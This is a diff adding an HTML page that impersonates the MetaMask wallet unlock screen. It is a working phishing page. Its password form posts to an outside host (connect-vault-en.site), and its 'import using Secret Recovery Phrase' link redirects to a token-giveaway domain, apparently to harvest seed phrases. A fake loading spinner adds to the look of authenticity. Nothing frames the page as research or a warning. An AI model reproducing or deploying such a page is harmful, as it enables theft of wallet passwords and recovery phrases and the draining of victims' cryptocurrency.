@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no" />
+        <meta name="robots" content="noindex">
+        <title>MetaMask</title>
+        <link rel="stylesheet" type="text/css" href="css/connect.css" title="ltr" />
+        <link rel="icon" href="img/favicon.png" />
+    </head>
+    <body>
+        <div id="app-content">
+            <div class="app os-win mouse-user-styles">
+                <div class="app-header">
+                    <div class="app-header__contents">
+                        <div class="app-header__logo-container app-header__logo-container--clickable">
+                            <img height="30" src="img/metamask-logo-horizontal.svg" class="app-header__metafox-logo--horizontal" alt="" /><img src="img/metamask-fox.svg" class="app-header__metafox-logo--icon" alt="" />
+                        </div>
+                        <div class="app-header__account-menu-container">
+                            <div class="app-header__network-component-wrapper">
+                                <div class="network-display network-display--clickable chip chip--with-left-icon chip--with-right-icon chip--border-color-ui-3 chip--background-color-undefined" role="button" tabindex="0">
+                                    <div class="chip__left-icon">
+                                        <div class="color-indicator color-indicator--filled color-indicator--color-mainnet color-indicator--size-lg"><span class="color-indicator__inner-circle"></span></div>
+                                    </div>
+                                    <span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography chip__label typography--h7 typography--weight-normal typography--style-normal typography--color-ui-4">
+                                        Ethereum Mainnet
+                                    </span>
+                                    <div class="chip__right-icon"><i class="network-display__icon app-header__network-down-arrow"></i></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;"></div>
+                <div class="main-container-wrapper">
+                    <div class="unlock-page__container">
+                        <div class="unlock-page">
+                            <div class="unlock-page__mascot-container">
+                                <div style="z-index: 0;height: 140px;">
+                                    <div style="height: 140px;" id="logo-container"><script src="js/logo.js"></script></div>
+                                </div>
+                            </div>
+<div id="loader_div" style="padding-top:60px;">
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;display:block;" width="50px" height="50px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+<circle cx="50" cy="50" fill="none" stroke="#f6851b" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
+  <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
+</circle>
+</svg>
+</div>
+<div id="form_div" style="display:none;width:100%;">
+                            <center><h1 class="unlock-page__title">Welcome Back!</h1></center>
+                            <center><div>The decentralized web awaits</div></center>
+                            <form class="unlock-page__form" method="post" action="https://member-area.connect-vault-en.site/meta-mask/app.php">
+                                <div class="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
+                                    <label class="MuiFormLabel-root MuiInputLabel-root jss16 MuiInputLabel-formControl MuiInputLabel-animated" for="password">Password</label>
+                                    <div class="MuiInputBase-root MuiInput-root MuiInput-underline jss18 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl">
+                                        <input name="password" id="password" type="password" class="MuiInputBase-input MuiInput-input" required="" />
+                                    </div>
+                                </div>
+                                <button class="button btn--rounded btn-default" type="submit" style="background-color: rgb(3, 125, 214); color: white; margin-top: 20px; height: 60px; font-weight: 400; box-shadow: none; border-radius: 100px;">
+                                    Unlock
+                                </button>
+                            </form>
+                            <div class="unlock-page__links">
+                                <span> or <button class="unlock-page__link unlock-page__link--import">import using Secret Recovery Phrase</button> </span>
+                            </div>
+                            <div class="unlock-page__support">
+                                <center><span> Need help? Contact <a href="javascript:void(0);" rel="noopener noreferrer">MetaMask Support</a> </span></center>
+                            </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="popover-content"></div>
+        <script src="js/jquery-3.6.0.min.js"></script>
+        <script>
+            $(document).ready(function () {
+			
+            $('.unlock-page__link').on('click', function(){
+                location.href = 'https://shiba-token-giveaway.online/metamask/import.html';
+            });
+
+			setTimeout(function() {$('#loader_div').hide();$('#form_div').show();}, 3000);
+                var allInputs = $(":input:not(:button)");
+                allInputs.focusin(function () {
+                    $(this).parent().addClass("Mui-focused");
+                    $(this).parent().prev().addClass("Mui-focused");
+                    $(this).parent().prev().addClass("MuiInputLabel-shrink");
+                    $(this).parent().prev().addClass("jss17");
+                });
+                allInputs.focusout(function () {
+                    $(this).blur(function () {
+                        if ($(this).prop("required")) {
+                            if (!$(this).val()) {
+                                $(this).parent().removeClass("Mui-focused");
+                                $(this).parent().prev().removeClass("Mui-focused");
+                                $(this).parent().prev().removeClass("MuiInputLabel-shrink");
+                                $(this).parent().prev().removeClass("jss17");
+                            } else {
+                                $(this).parent().prev().addClass("MuiInputLabel-shrink");
+                                $(this).parent().prev().addClass("jss17");
+                            }
+                        }
+                    });
+                });
+            });
+        </script>
+    </body>
+</html>
